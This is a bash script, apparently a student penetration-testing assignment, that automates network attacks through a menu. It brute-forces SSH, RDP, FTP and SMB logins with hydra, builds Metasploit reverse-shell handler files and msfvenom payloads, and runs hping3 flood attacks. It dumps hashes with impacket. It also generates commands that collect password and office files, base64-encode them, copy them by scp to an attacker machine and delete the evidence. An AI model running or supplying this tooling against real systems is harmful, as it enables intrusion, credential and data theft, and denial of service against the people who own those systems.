#!/bin/bash

# Student Name: Tan You
# Student Code: s29
# Class Code: CCK2_250506
# Lecturer's Name: Tushar
set +H

declare __helpMenu="
Required software:
msfconsole
msfvenom
hydra
nmap
seclists
hping3
python3-impacket

Usage: sudo $0 [OPTIONS]

Options:
    -h                          Displays this help menu and exit
    -n [NETWORK_RANGE]          Network range to scan. The mask must also be given (see example)
    -d [DIR_NAME]               Optional argument. Fully qualified name of output directory that all results will be saved into.
                                If no name is give, a default name of the network range will be used.
                                And the directory will be created where this program is ran.
    -s [b or f]                 Scan type. 'b' for basic scan, 'f' for full scan. 

Example:

sudo $0 192.168.1.0/24 -s b
sudo $0 172.16.1.0/16 -d /home/user/test_dir -s f
"

if [ $# -eq 0 ]; then
    echo "No options given. Use the '-h' options to see the help menu."
    exit 0
fi

declare __optionsMenu="
Choose your option:
1) Look for weak login credentials in common network services (SSH, RDP, FTP, and SMB).
2) Create a .rc file to use Metasploit to automate the use of exploits / suggester / handler.
3) Generate a payload.
4) Gemerate commands to exfiltrate data.
5) DDOS a target
6) Enumerate SMB Shares from a target
7) Dump hashes from a target
8) Quit the program.
Input: "
declare optionChosen=1

declare __ddosOptions="
Press Enter to use ICMP to DDOS, otherwise, choose your option:
1) ICMP
2) TCP SYN
3) UDP
4) RAW IP
Input: "

declare current_pentest_file_name=$0
declare breakpoint="--------------------"
declare nmap_stats_timing="30s"
declare network
declare host_ip
declare ip_regex='^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/[0-9]+$'
declare dir_name
declare scan_type
declare username_file="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
declare password_file="/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
declare default_username_file="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
declare default_password_file="/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
declare password_short_file="/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt"
declare password_file_given=false
declare use_zip=false
declare all_argument_pass=true #true = all arguments pass the test, false = at least one failed
declare current_datetime=$(date +"%Y-%m-%d_%H-%M-%S")
declare target_file_name="targets.txt"
declare tcp_ports_file_name="tcpports.txt"
declare udp_ports_file_name="udpports.txt"
declare service_version_file_name="services.xml"
declare weak_passwords_file_name="weak_passwords.txt"
declare weak_credentials_file_name="weak_credentials.txt"
declare vulnerabilities_file_name="vulnerabilities.txt"
declare -a common_network_services=("ssh" "rdp" "ftp" "smb" "microsoft windows")
declare log_file_name="logs.txt"
declare command_file_name="commands.txt"
declare metasploit_modules_folder="/usr/share/metasploit-framework/modules/"
declare output_dir=""
declare resource_file_name="output.rc"
declare smb_shares_file_name="smb_shares.txt"
declare hash_dump_file_name="hash_dump.txt"

log_output(){
    # For anything important done in this script, append them into the log file.
    # Formatted appropriately for easy reading.
    # Edit: this will also log into the /var/log folder.
    info=$1
    log_input="$(date -u '+%a %F %T:%N %Z')"": "$info
    echo $log_input >> $dir_name/$current_datetime+$log_file_name
    echo $log_input >> /var/log/$current_pentest_file_name+$current_datetime.log
}

weak_credentials(){
    # This function runs after all scanning has been done.
    # For each live host found, check if their common network services are up.
    # Common network services are: SSH, RDP, FTP, and SMB.
    # Note that each network service could exist on multiple port numberss.
    # For each network services that are up, attempt to enumerate
    # them for any weak usernames and passwords.
    # For each weak usernames and passwords found, display to user,
    # and save the results to a file.
    echo $breakpoint
    input_correct=false
    while [[ "$input_correct" == false ]] do
        echo "The default username list is at: $default_username_file"
        read -p "Press Enter to use default, otherwise enter a fully qualified path to another one: " username_file
            if [[ -z $username_file ]]; then
                username_file=$default_username_file
                input_correct=true
            elif [[ ! -f $username_file ]]; then
                echo "Given username file does not exists."
                input_correct=false
                username_file=$default_username_file
            else
                input_correct=true
            fi
    done
    input_correct=false
    while [[ "$input_correct" == false ]] do
        echo "The default password list is at: $default_password_file"
        read -p "Press Enter to use default, otherwise enter a fully qualified path to another one: " password_file
            if [[ -z $password_file ]]; then
                password_file=$default_password_file
                input_correct=true
            elif [[ ! -f $password_file ]]; then
                echo "Given username file does not exists."
                input_correct=false
                password_file=$default_password_file
            else
                input_correct=true
            fi
    done
    local targets=()
    while IFS= read -r line; do
        targets+=("$line")
    done <"$dir_name/$current_datetime+$target_file_name"
    if [[ ! -z $targets ]]; then #at least one target
        for target in "${targets[@]}"
        do
            echo "targeting" $target
            for service in "${common_network_services[@]}"
            do
                #note: ssh has error with student_pt, as it uses a weak encryption
                #so maybe need to update server manually.
                echo "testing credentials against:" $service
                #result="$(cat $dir_name/$current_datetime+$service_version_file_name | grep $target | grep "Ports" | awk -F'Ports:' '{print $2}' | awk -F',' -v service="$service" '{for (i=1; i<=NF; i++) {if ($i ~ service) {print $i}}}' | awk -F'/' '{print $1}')"
                result="$(cat $dir_name/$current_datetime+$service_version_file_name | grep -i $service | grep -i -o -E "portid=\"[0-9]+\"" | awk -F'=' '{print $2}' | tr -d "\"" )"
                if [[ ! -z $result ]]; then #at least one port number returned
                    IFS=" \t\n" read -r -a ports <<< "$result"
                    unset IFS
                    for port in "${ports[@]}"
                    do
                        hydra -I -L $username_file -P $password_file -s $port $target $service -o $dir_name/$current_datetime+$target+$service+$port+$weak_credentials_file_name
                        echo "results stored in $dir_name/$current_datetime+$target+$service+$port+$weak_credentials_file_name"
                        log_output "Credentials checking results stored in $dir_name/$current_datetime+$target+$service+$port+$weak_credentials_file_name"
                    done
                fi
                echo $breakpoint
            done
        done
    fi
}

metasploit_modules_search(){
    # Given the name of the module, search through the metasploits module folder
    # If the full name of the module exists, return it.
    # If not, return up to the correct folder where the module exists.
    # Note 1: the user could have entered an incorrect name.
    # Note 2: the user could have given a partial name.
    # Assume that the input given is the correct format.
    # I.E "name/name/name"
    IFS="/"
    local current_folder=$metasploit_modules_folder
    read -ra folder_array <<< "$1"
    unset IFS
    local last_element=${folder_array[-1]}
    output_dir="$(ls $metasploit_modules_folder)"
    local no_file_or_permission="ls: cannot "
    for folder in "${folder_array[@]}"
    do
        if [[ $folder == $last_element ]]; then
            #if it is the last element, check if it is a folder or file.
            current_folder+="$folder"
            test_out_dir="$(ls $current_folder 2> /dev/null)"
            if [[ -z $test_out_dir ]]; then
                #maybe not a folder, add ".rb" to the end to check if file.
                current_folder+=".rb"
                test_out_dir="$(ls $current_folder)"
                if [[ -z $test_out_dir ]]; then
                    #no file exists. return previous output_dir
                    break
                else
                    #is a file, and could be what the user is looking for.
                    #return this result.
                    output_dir=$test_out_dir
                fi
            else
                #last element is a folder. return this list value.
                output_dir=$test_out_dir
            fi
        else
            #not last element. repeat checking until hit error.
            current_folder+="$folder/"
            test_out_dir="$(ls $current_folder 2>/dev/null)"
            if [[ -z $test_out_dir ]]; then
                #the folder does not exists, perhaps due to spelling mistake.
                #end the loop prematurely.
                break
            else
                #it exists. continue until folder_array is exhausted.
                #save this answer until next loop
                output_dir=$test_out_dir
            fi
        fi
    done
    
}

resource_file(){
    # This function runs after all scanning has been done.
    # Allow the user to choose which .rc file to generate to do one of the following:
    # 1. Exploit ssh login with auxiliary/scanner/ssh/ssh_login module or let the user select another module
    # 2. Create a handler (exploit/multi/handler) with a given payload
    # 3. Use the suggester
    # Also ask the user to request if it is to be exploited/ran immediately
    # Then, allow the user to choose if they want to execute the .rc file

    local option_chosen=1
    local input_correct=false
    local module_chosen="auxiliary/scanner/ssh/ssh_login"
    local payload_chosen="payload/generic/shell_reverse_tcp"
    echo $breakpoint
    echo "Please note that this option requires msfconsole to be installed on this machine."
    echo $breakpoint
    while [[ "$input_correct" == false ]] do
        echo "Choose which type of resource file to generate:"
        echo "1. Use a module and set the options (default: auxiliary/scanner/ssh/ssh_login)"
        echo "2. Use exploit/multi/handler with a selected payload (default payload: payload/generic/shell_reverse_tcp)"
        echo "3. Use the local exploit suggester (default: session 0)"
        read -p "Enter your choice number here (leave empty for default: 1): " option_chosen
        if [[ -z $option_chosen ]]; then
            option_chosen=1
            input_correct=true
        elif [[ $option_chosen -ne 1 && $option_chosen -ne 2 && $option_chosen -ne 3 ]]; then
            echo "Please only choose 1, 2 or 3."
            input_correct=false
        else
            input_correct=true
        fi

    done
    echo $breakpoint
    case $option_chosen in
        1)
            echo "Option chosen: Create Module."
            input_correct=false
            while [[ "$input_correct" == false ]] do
                echo "The default module is auxiliary/scanner/ssh/ssh_login"
                echo "Enter 1 to use the in-built search to find another module to use."
                echo "Otherwise, enter 0 to continue if you want to use default,"
                read -p "or you already know what module to use: " option_chosen
                if [[ -z $option_chosen ]]; then
                    option_chosen=0
                    input_correct=true
                elif [[ $option_chosen -ne 0 && $option_chosen -ne 1 ]]; then
                    echo "Please only choose 0, or 1."
                    input_correct=false
                else
                    input_correct=true
                fi
            done
            if [[ $option_chosen -eq 1 ]]; then
                #use the search to find the module the user needs.
                echo $breakpoint
                echo "Searching for Module."
                echo "Module names are in this format: name/name/name"
                echo "There can be more than 1 \"/\" in the name"
                read -p "Type in the module name in the format, or type 0 to exit: " option_chosen
                while [[ "$option_chosen" != 0 ]] do
                    metasploit_modules_search $option_chosen
                    echo "This was the best result of your search:"
                    echo $output_dir
                    read -p "Type in the module name to continue searching, or type 0 to exit: " option_chosen
                done

            fi
            echo $breakpoint
            echo "Module names are in this format: name/name/name"
            echo "If you found the full file path in your search, only include the path after 'modules/'"
            echo "For example: if you found '/usr/share/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_login.rb'"
            echo "Your module would be: auxiliary/scanner/ssh/ssh_login.rb"
            read -p "Enter your module choice here (leave empty to use default): " module_chosen
            if [[ -z $module_chosen ]]; then
                module_chosen="auxiliary/scanner/ssh/ssh_login"
            fi
            echo "Looking for necessary options to fill in..."
            module_file_name="$(echo $module_chosen | tr '/' '_')"
            touch $dir_name/$current_datetime+$module_file_name+$resource_file_name
            touch "temp_msf_output.txt"
            echo "use $module_chosen
show options
exit
" > $dir_name/$current_datetime+$module_file_name+$resource_file_name
            msfconsole -r $dir_name/$current_datetime+$module_file_name+$resource_file_name > temp_msf_output.txt
            basic_options="$(sed -n "/Module options/,/full module info/p" temp_msf_output.txt | grep -E 'yes|no')"
            echo "$basic_options"
            echo $breakpoint
            echo "These are the list of options in their default values for the module:" $module_chosen
            echo "For each option here that you wish to set differently, enter a comma seperated list of option and setting."
            echo "Example: rhosts 192.168.12.12,rport 12345,username test,user_as_pass true"
            IFS=","
            read -a basic_options_list -p "Enter them here: "
            unset IFS
            echo "use $module_chosen" > $dir_name/$current_datetime+$module_file_name+$resource_file_name
            for basic_option_element in "${basic_options_list[@]}"; do
                echo "set $basic_option_element" >> $dir_name/$current_datetime+$module_file_name+$resource_file_name
            done
            echo "exploit" >> $dir_name/$current_datetime+$module_file_name+$resource_file_name
            echo "" >> $dir_name/$current_datetime+$module_file_name+$resource_file_name
            echo "Resource file stored at: "$dir_name/$current_datetime+$module_file_name+$resource_file_name
            read -p "Do you wish to run the resource file now? (y/n)" option_chosen
            if [[ $option_chosen == "y" ]]; then
                msfconsole -r $dir_name/$current_datetime+$module_file_name+$resource_file_name
            fi
            ;;
        2)
            echo "Option chosen: Using exploit/multi/handler."
            input_correct=false
            while [[ "$input_correct" == false ]] do
                echo "The default payload is payload/generic/shell_reverse_tcp"
                echo "Enter 1 to use the in-built search to find another payload to use."
                echo "Otherwise, enter 0 to continue if you want to use default,"
                read -p "or you already know what payload to use: " option_chosen
                if [[ -z $option_chosen ]]; then
                    option_chosen=0
                    input_correct=true
                elif [[ $option_chosen -ne 0 && $option_chosen -ne 1 ]]; then
                    echo "Please only choose 0, or 1."
                    input_correct=false
                else
                    input_correct=true
                fi
            done
            if [[ $option_chosen -eq 1 ]]; then
                #use the search to find the module the user needs.
                echo $breakpoint
                echo "Searching for payload."
                echo "Module search names are in this format: name/name/name"
                echo "There can be more than 1 \"/\" in the name"
                read -p "Type in the module name in the format, or type 0 to exit: " option_chosen
                while [[ "$option_chosen" != 0 ]] do
                    metasploit_modules_search $option_chosen
                    echo "This was the best result of your search:"
                    echo $output_dir
                    read -p "Type in the payload name to continue searching, or type 0 to exit: " option_chosen
                done

            fi
            echo $breakpoint
            echo "Note: Payload names are in this format: payload/name/name"
            echo "For example If you searched for: payloads/singles/windows/x64/powershell_reverse_tcp.rb"
            echo "You need to type in: payload/windows/x64/powershell_reverse_tcp.rb"
            read -p "Enter your payload choice here (leave empty to use default): " payload_chosen
            if [[ -z $payload_chosen ]]; then
                payload_chosen="payload/generic/shell_reverse_tcp"
            fi
            echo "Looking for necessary options to fill in..."
            payload_file_name="$(echo $payload_chosen | tr '/' '_')"
            touch $dir_name/$current_datetime+$payload_file_name+$resource_file_name
            touch "temp_msf_output.txt"
            echo "use exploit/multi/handler
set payload $payload_chosen
show options
exit
" > $dir_name/$current_datetime+"exploit_multi_handler"+$payload_file_name+$resource_file_name
            msfconsole -r $dir_name/$current_datetime+"exploit_multi_handler"+$payload_file_name+$resource_file_name > temp_msf_output.txt
            basic_options="$(sed -n "/Payload options/,/Exploit target/p" temp_msf_output.txt | grep -E 'yes|no')"
            echo "$basic_options"
            echo $breakpoint
            echo "These are the list of options in their default values for the payload:" $payload_chosen
            echo "For each option here that you wish to set differently, enter a comma seperated list of option and setting."
            echo "Example: lhosts 192.168.12.12,lport 12345"
            IFS=","
            read -a basic_options_list -p "Enter them here: "
            unset IFS
            echo "use exploit/multi/handler
set payload $payload_chosen" > $dir_name/$current_datetime+"exploit_multi_handler"+$payload_file_name+$resource_file_name
            for basic_option_element in "${basic_options_list[@]}"; do
                echo "set $basic_option_element" >> $dir_name/$current_datetime+"exploit_multi_handler"+$payload_file_name+$resource_file_name
            done
            echo "exploit -j" >> $dir_name/$current_datetime+"exploit_multi_handler"+$payload_file_name+$resource_file_name
            echo "" >> $dir_name/$current_datetime+"exploit_multi_handler"+$payload_file_name+$resource_file_name
            echo "Resource file stored at: "$dir_name/$current_datetime+"exploit_multi_handler"+$payload_file_name+$resource_file_name
            read -p "Do you wish to run the resource file now? (y/n)" option_chosen
            if [[ $option_chosen == "y" ]]; then
                msfconsole -r $dir_name/$current_datetime+"exploit_multi_handler"+$payload_file_name+$resource_file_name
            fi
            ;;
        3)
            echo "Option chosen: Using local exploit suggester."
            echo "use post/multi/recon/local_exploit_suggester
set SESSION 1
exploit
" > $dir_name/$current_datetime+"local_exploit_suggester"+$resource_file_name
            echo "Resource file stored at: "$dir_name/$current_datetime+"local_exploit_suggester"+$resource_file_name
            read -p "Do you wish to run the resource file now? (y/n)" option_chosen
            if [[ $option_chosen == "y" ]]; then
                msfconsole -r $dir_name/$current_datetime+"local_exploit_suggester"+$resource_file_name
            fi
            ;;
        *)
            echo "Unknown option chosen. Exiting..."
            ;;
    esac
}

generate_payload(){
    # This function runs after all scanning has been done.
    # Request from the user a directory to store the payload.
    # If not given, use the eariler one given or the default one.
    # Then, request from the user, the full name of the payload to use.
    # From the payload, find out the basic required options to fill. 
    # afterwards, request the output format and name of the file.
    # Finally, give the user the option to add more if necessary.
    local directory_name=""
    local payload_name=""
    local input_correct=false
    while [[ "$input_correct" == false ]] do
        echo "Provide a fully qualified directory path to store the payload."
        read -p "Otherwise, press enter to use the eariler directory: " directory_name
            if [[ -z $directory_name ]]; then #use eariler directory
                directory_name=$dir_name
                input_correct=true
            elif [[ ! -d $directory_name ]]; then
                echo "Directory name given does not exist."
                input_correct=false
            fi
    done
    input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "Provide the full name of the payload: " payload_name
        msfvenom -p $payload_name --list-options > $directory_name/temp_file.txt
        #if payload name is wrong or does not exist, the file is empty
        test_value=$(cat $directory_name/temp_file.txt)
        if [[ -z $test_value ]]; then
            echo "Payload name given does not exist. Please try again."
            input_correct=false
        else
            input_correct=true
        fi
    done
    #grab the basic values
    local basic_values_headers=()
    declare -A basic_values
    local file_format=""
    local file_name=""
    local additional_commands=""
    local basic_value_command=""
    result=$(cat $directory_name/temp_file.txt | awk '/Basic options:/{flag=1} flag; /Description:/{flag=0}' | grep -i " yes " | awk '{print $1}')
    IFS=$'\n' read -r -d '' -a basic_values_headers <<< "$result"
    printf '%s\n' "${basic_values_headers[@]}"
    unset IFS
    for basic_value_header in "${basic_values_headers[@]}"
    do
        basic_values[$basic_value_header]="test $basic_value_header"
    done
    #ask users for values for the basic values
    for basic_value_header in "${basic_values_headers[@]}"
    do
        read -p "Please provide value for $basic_value_header: " value
        basic_values["$basic_value_header"]="$value"
    done
    echo "If you have any additonal payload options and values, please provide them in the following format:"
    echo "e.g. optionName1=value1 optionName2=value2"
    read -p "otherwise, please press enter to continue: " additional_commands
    read -p "Please provide file format, without the '.' (for example: exe): " file_format
    read -p "Please provide name of file: " file_name
    echo "Generating payload..."
    for basic_value_header in "${basic_values_headers[@]}"
    do
        basic_value_command+=$basic_value_header"="${basic_values["$basic_value_header"]}" "
    done
    msfvenom -p $payload_name $basic_value_command$additional_commands "-f" $file_format "-o" $directory_name/$file_name
}

data_exfiltration(){
    # This function runs after all scanning has been done.
    # Request from the user which operating system to attack: Linux or Windows.
    # Then, depending on the OS specified, the commands generated will do the following:
    # 1. Look for files in all possible directories containing these keywords: [password, .docx, .xlsx.].
    # 2. Copy all of the files and compress them into a single compressed file (tar gzip, zip).
    # 3. Encode the compressed file into base64.
    # 4. SCP the result to the user's machine, or another ip address and/or port if specified.
    # The commands generated will all be displayed to the user, as well as saved to a file.
    local os_to_attack=0 # 0=Linux, 1=Windows
    local attacker_to_scp=$host_ip # will default to the host_ip unless otherwise specified.
    local port_to_scp=22 #will default to 22 unless otherwise specified
    local username_to_use=""
    local input_correct=false
    local attack_ip_regex='^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    local port_num_regex='^([1-9]|[1-9][0-9]{1,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$'
    # Need to inform user this information for successful data exfiltration
    echo $breakpoint
    echo "For data exfiltration, the commands generated assume you have a account that
does not need to have a password to ssh into to easily send files across.
In addition, the attacker/receiver's machine's ssh server will need to have
\"PermitEmptyPasswords\" option set to \"yes\" for this to work."
    echo $breakpoint
    while [[ "$input_correct" == false ]] do
        echo "Provide the OS to attack [0=Linux(default), 1=Windows]:"
        read -p "Press Enter to continue for default 0, otherwise enter 1: " os_to_attack
            if [[ -z $os_to_attack ]]; then
                os_to_attack=0
                input_correct=true
            elif [[ $os_to_attack -ne 0 && $os_to_attack -ne 1 ]]; then
                echo "OS type given must be either 0 or 1."
                input_correct=false
                os_to_attack=0
            else
                input_correct=true
            fi
    done
    input_correct=false
    while [[ "$input_correct" == false ]] do
        echo "Provide the ip address for the attacker machine to send the result back to:"
        read -p "Press Enter to use your local ip address, otherwise provide one: " attacker_to_scp
            if [[ -z $attacker_to_scp ]]; then
                attacker_to_scp=$host_ip
                input_correct=true
            elif [[ ! $attacker_to_scp =~ $attack_ip_regex ]]; then
                echo "Ip address given is in the incorrect format"
                input_correct=false
            else
                input_correct=true
            fi
    done
    input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "Press Enter to use port 22, otherwise provide one[1-65535]: " port_to_scp
            if [[ -z $port_to_scp ]]; then
                port_to_scp=22
                input_correct=true
            elif [[ ! $port_to_scp =~ $port_num_regex ]]; then
                echo "Port number given must be in the range 1-65535."
                input_correct=false
            else
                input_correct=true
            fi
    done
    input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "Press provide the username to scp to: " username_to_use
            if [[ -z $username_to_use ]]; then
                echo "Please provide a username."
                input_correct=false
            else
                input_correct=true
            fi
    done
    echo $breakpoint
    if [[ $os_to_attack -eq 0 ]]; then
        touch $dir_name/$current_datetime+"linux"+$command_file_name
        echo "mkdir results
cd results
find / -type f -iname *password* -exec cp -t . {} + 2>/dev/null
find / -type f -iname *docx* -exec cp -t . {} + 2>/dev/null
find / -type f -iname *xlsx* -exec cp -t . {} + 2>/dev/null
cd ..
tar -zcf results.tar.gz results
base64 results.tar.gz > results_tar_gz.b64
scp -P $port_to_scp results_tar_gz.b64 $username_to_use@$attacker_to_scp:~
yes | rm -r results*" > $dir_name/$current_datetime+"linux"+$command_file_name
        cat $dir_name/$current_datetime+"linux"+$command_file_name
        echo "Commands stored in:" $dir_name/$current_datetime+"linux"+$command_file_name
    else 
        #for windows, files can be stored in multiple drives
        #so all drives need to be found, and all of them need to be searched.
        touch $dir_name/$current_datetime+"windows"+$command_file_name
        echo "mkdir results
cd results
\$drives = Get-PSDrive -PSProvider FileSystem
foreach (\$drive in \$drives) {
    Write-Host \"Searching drive: \$(\$drive.Root)\"
    try {
        Get-ChildItem -Path \"\$(\$drive.Root)\" -Filter \"*password*\" -File -Recurse -ErrorAction Ignore | Copy-Item -Destination . -ErrorAction Ignore
        Get-ChildItem -Path \"\$(\$drive.Root)\" -Filter \"*.docx*\" -File -Recurse -ErrorAction Ignore | Copy-Item -Destination . -ErrorAction Ignore
        Get-ChildItem -Path \"\$(\$drive.Root)\" -Filter \"*.xlsx*\" -File -Recurse -ErrorAction Ignore | Copy-Item -Destination . -ErrorAction Ignore
    }
    catch {
        Write-Host \"Could not access drive \$(\$drive.Root): \$(\$_.Exception.Message)\"
    }
}
cd ..
Compress-Archive results results.zip
certutil -encode results.zip results_zip.b64
scp -P $port_to_scp results_zip.b64 $username_to_use@$attacker_to_scp:~
Remove-Item -Path "results*" -Recurse -Force" > $dir_name/$current_datetime+"windows"+$command_file_name 
        cat $dir_name/$current_datetime+"windows"+$command_file_name
        echo "Commands stored in:" $dir_name/$current_datetime+"windows"+$command_file_name
    fi
    echo $breakpoint
}

ddos_attack(){
    # This function runs after all scanning has been done.
    # Request from the user which IP address to DDOS. This will default to the first found IP Address on the scanned list.
    # Then, request the type of packets to send: ICMP, TCP, UDP or RAWIP. This will default to ICMP.
    local ddos_ip=$(head -n 1 $dir_name/$current_datetime+$target_file_name)
    local -a ddos_type_list=("icmp" "syn" "udp" "rawip")
    local ddos_type="icmp"
    local input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "Press Enter to target $ddos_ip, otherwise provide a different one: " ddos_ip
            if [[ -z $ddos_ip ]]; then
                ddos_ip=$(head -n 1 $dir_name/$current_datetime+$target_file_name)
                input_correct=true
            elif [[ ! $ddos_ip =~ ^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$ ]]; then
                echo "Ip address given must be in the correct format."
                input_correct=false
            else
                input_correct=true
            fi
    done
    input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "$__ddosOptions" ddos_type
            if [[ -z $ddos_type ]]; then
                ddos_type="icmp"
                input_correct=true
            elif [[ ! $ddos_type =~ ^[0-9]+$ ]]; then
                echo "Input given is not a number. Please try again."
                input_correct=false
            else
                case $ddos_type in
                    1)
                        ddos_type="icmp"
                        input_correct=true
                        ;;
                    2)
                        ddos_type="syn"
                        input_correct=true
                        ;;
                    3)
                        ddos_type="udp"
                        input_correct=true
                        ;;
                    4)
                        ddos_type="rawip"
                        input_correct=true
                        ;;
                    *)
                        echo "Unknown option chosen. Please try again."
                        input_correct=false
                        ;;
                esac
            fi
    done
    touch $dir_name/$current_datetime+$ddos_type+$ddos_ip+"ddos"
    echo "Running $ddos_type DDOS attack on $ddos_ip on $(date +"%Y-%m-%d_%H-%M-%S")"
    echo "Running $ddos_type DDOS attack on $ddos_ip on $(date +"%Y-%m-%d_%H-%M-%S")" >> $dir_name/$current_datetime+$ddos_type+$ddos_ip+"ddos"
    log_output "Running $ddos_type DDOS attack on $ddos_ip on $(date +"%Y-%m-%d_%H-%M-%S")"
    hping3 -d 65495 --$ddos_type --flood $ddos_ip &
    local background_pid=$!
    local some_input=""
    read -p "DDOS is running in the background. Press enter to kill it and return to main menu." some_input
    kill $background_pid
    echo "$ddos_type DDOS attack on $ddos_ip has stopped on $(date +"%Y-%m-%d_%H-%M-%S")"
    echo "$ddos_type DDOS attack on $ddos_ip has stopped on $(date +"%Y-%m-%d_%H-%M-%S")" >> $dir_name/$current_datetime+$ddos_type+$ddos_ip+"ddos"
    log_output "$ddos_type DDOS attack on $ddos_ip has stopped on $(date +"%Y-%m-%d_%H-%M-%S")"
    echo "$background_pid process has been killed. Returning to main menu."
}

smb_enum(){
    # This function runs after all scanning has been done.
    # Request from the user which IP address range to enumerate. This will default to the initial network range given.
    # Then, use nmap to enumerate the shares.
    # smb port numbers will be taken from the initial scan.
    local smb_ip_network=$network
    local input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "Press Enter to target $smb_ip_network for SMB, otherwise provide a different network: " smb_ip_network
            if [[ -z $smb_ip_network ]]; then
                smb_ip_network=$network
                input_correct=true
            elif [[ ! $smb_ip_network =~ $ip_regex ]]; then
                echo "Ip address given must be in the correct format."
                input_correct=false
            else
                input_correct=true
            fi
    done
    smb_ports="$(cat $dir_name/$current_datetime+$service_version_file_name | grep -i "microsoft windows" | grep -i -o -E 'portid="[0-9]+"' | awk -F'=' '{print $2}' | tr -d "\"" | tr [:space:] "," )"
    echo "Enumerating SMB shares of $smb_ip_network for ports $smb_ports on $(date +"%Y-%m-%d_%H-%M-%S")"
    log_output "Enumerating SMB shares of $smb_ip_network for ports $smb_ports on $(date +"%Y-%m-%d_%H-%M-%S")"
    nmap --script smb-enum-shares -p$smb_ports $smb_ip_network > $dir_name/$current_datetime+$smb_shares_file_name
    cat $dir_name/$current_datetime+$smb_shares_file_name
    echo "SMB shares results saved at $dir_name/$current_datetime+$smb_shares_file_name"
    log_output "smb shares results saved at $dir_name/$current_datetime+$smb_shares_file_name"
}

impacket_hashdump(){
    # This function runs after all scanning has been done.
    # Request from the user which IP address to hash dump. This will default to the first ip address found from initial scan.
    # Then, request from the user the domain, username, password.
    # Finally, extract the hashes into a file.
    local hash_dump_ip=$(head -n 1 $dir_name/$current_datetime+$target_file_name)
    local hash_dump_domain
    local hash_dump_username
    local hash_dump_password
    local input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "Press Enter to target $hash_dump_ip for hash dump, otherwise provide an IP address: " hash_dump_ip
            if [[ -z $hash_dump_ip ]]; then
                hash_dump_ip=$(head -n 1 $dir_name/$current_datetime+$target_file_name)
                input_correct=true
            elif [[ ! $hash_dump_ip =~ ^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$ ]]; then
                echo "Ip address given must be in the correct format."
                input_correct=false
            else
                input_correct=true
            fi
    done
    input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "Please provide the domain that the target is in. If it is a local domain, enter a \".\": " hash_dump_domain
            if [[ -z $hash_dump_domain ]]; then
                echo "Domain cannot be blank. If it is a local domain, enter a \".\""
                input_correct=false
            else
                input_correct=true
            fi
    done
    input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "Please provide the username of target: " hash_dump_username
            if [[ -z $hash_dump_username ]]; then
                echo "Username cannot be blank."
                input_correct=false
            else
                input_correct=true
            fi
    done
    input_correct=false
    while [[ "$input_correct" == false ]] do
        read -p "Please provide the password of the target: " hash_dump_password
            if [[ -z $hash_dump_password ]]; then
                echo "Password cannot be blank."
                input_correct=false
            else
                input_correct=true
            fi
    done
    echo "Dumping hashes of $hash_dump_domain/$hash_dump_username:$hash_dump_password@$hash_dump_ip"
    log_output "Dumping hashes of $hash_dump_domain/$hash_dump_username:$hash_dump_password@$hash_dump_ip"
    impacket-secretsdump "$hash_dump_domain/$hash_dump_username:$hash_dump_password@$hash_dump_ip" -outputfile $dir_name/$current_datetime+$hash_dump_ip+$hash_dump_file_name
    cat $dir_name/$current_datetime+$hash_dump_ip+$hash_dump_file_name*
    echo "Hashes saved at $dir_name/$current_datetime+$hash_dump_ip+$hash_dump_file_name\*"
    log_output "Hashes saved at $dir_name/$current_datetime+$hash_dump_ip+$hash_dump_file_name\*"
}


# Check each option for values
while getopts "n:d:s:h" option; do
    case $option in
        n) # get ip address
            network=$OPTARG;;
        d) # get directory name
            dir_name=$OPTARG;;
        s) # get scan type
            scan_type=$OPTARG;;
        h) # display Help menu and exit
            echo "$__helpMenu"
            exit;;
        \?) # tell user to use the help menu and exit
            echo "Unknown error or invalid option. Use the '-h' options to see the help menu"
            exit;;
   esac
done

# This code checks if the script is being run as root. if not, exit.
# This line is placed here after "getopts" so that the help menu can be displayed
# even without root.
if [ "$EUID" -ne 0 ]; then
    echo "Root/Superuser privileges are required to run this script. Use the '-h' option to see the help menu"
    exit
fi
echo "Running program, checking for errors in input."
# check if each input is valid and available.
if [[ -z $network ]]; then
    echo "Network range must be given."
    all_argument_pass=false
elif [[ ! $network =~ $ip_regex ]]; then #check if ip address is in the correct format according to regex.
    echo "Ip address range must be in a proper format."
    all_argument_pass=false
fi
if [[ -z $dir_name ]]; then
    echo "No Directory name given. Network range will be used as the default directory"
    dir_name="$(echo $network | tr '/' '_' )"
    mkdir $dir_name
elif [[ ! -d $dir_name ]]; then
    echo "Directory name given does not exist."
    all_argument_pass=false
fi
if [[ -z $scan_type ]]; then
    echo "Scan type must be given."
    all_argument_pass=false
elif [[ $scan_type != "b" && $scan_type != "f" ]]; then
    echo "Scan type must be either 'b' or 'f'."
    all_argument_pass=false
fi
if [[ "$all_argument_pass" == false ]]; then
    echo "There were errors. Use the '-h' options to see the help menu"
    exit 1
else
    echo "No errors could be found. Continuing..."
fi

echo $breakpoint
if [ ! -f "$dir_name/$current_datetime+$log_file_name" ]; then
    echo "Creating log file at:" $dir_name/$current_datetime+$log_file_name
